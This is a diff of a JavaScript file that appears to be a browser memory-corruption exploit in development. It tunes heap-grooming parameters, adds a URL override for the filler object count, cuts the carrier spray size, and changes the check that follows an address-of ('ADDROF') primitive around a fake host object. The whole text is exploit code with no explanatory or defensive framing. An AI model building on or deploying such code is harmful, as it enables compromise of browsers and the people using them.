@@ -6,7 +6,16 @@ const DUPLICATE_INDEX = 2;
 const CONTROL_INDEX = 0xffff;
 const CONTROL_INT = -64000;
 const FILLER_BIGINTS = K - 1;
-const FILLER_OBJECTS = 0xfffe - K;
+
+const FILLER_OVERRIDE = (function () {
+  try {
+    const q = new URLSearchParams(location.search).get("filler");
+    const n = q ? parseInt(q, 10) : 0;
+    if (n >= 1000 && n <= 0xfffe) return n;
+  } catch (e) {}
+  return 0;
+})();
+const FILLER_OBJECTS = FILLER_OVERRIDE || (0xfffe - K);
 const EXPECTED_LENGTH = 0x50001;
 const CELL_BYTES = 0x30;
 const FUNCTION_BYTES = 0x20;
@@ -19,7 +28,7 @@ const CARRIER_SLOTS = (function () {
     const n = q ? parseInt(q, 10) : 0;
     if (n >= 100000 && n <= 40000000) return n;
   } catch (e) {}
-  return 12000000;
+    return 2000000;
 })();
 const CARRIER_BYTES = CARRIER_SLOTS * 8;
 const CAPTURE_DELAY_MS = 50;
@@ -667,12 +676,10 @@ function buildAndStoreGraph() {
   buildFakeHost();
 
   emit("SSV-BUILD", `k=${K}-n=${DRAIN_COUNT}`);
-  fillerGraph = new Array(0xfffd);
-  let pos = 0;
-  const huge = 1n << 40n;
-  for (let b = 0; b < FILLER_BIGINTS; ++b)
-    fillerGraph[pos++] = huge + BigInt(b);
-  for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
+ fillerGraph = new Array(0xfffd);
+let pos = 0;
+if (FILLER_BIGINTS > 0) fillerGraph[pos++] = (1n << 40n);
+for (let o = 0; o < FILLER_OBJECTS; ++o) fillerGraph[pos++] = {};
 
   outerGraph = new Array(CONTROL_INDEX + 1);
   outerGraph[0] = fillerGraph;
@@ -1176,8 +1183,7 @@ function beginComposition() {
     plausibleCell(b0) &&
     plausibleCell(a1) &&
     plausibleCell(b1);
-  const fakeChars = copiedLength >= 8 ? copiedLength - 8 : 0;
-  const sourceCovered = fakeChars * 2 <= CARRIER_BYTES;
+ const sourceCovered = copiedLength >= 23;
 
   emit("ADDROF-RETURNED", REVISION);
   emit("ADDROF-COPY", `chars=${copiedLength}-source-covered=${sourceCovered}`);
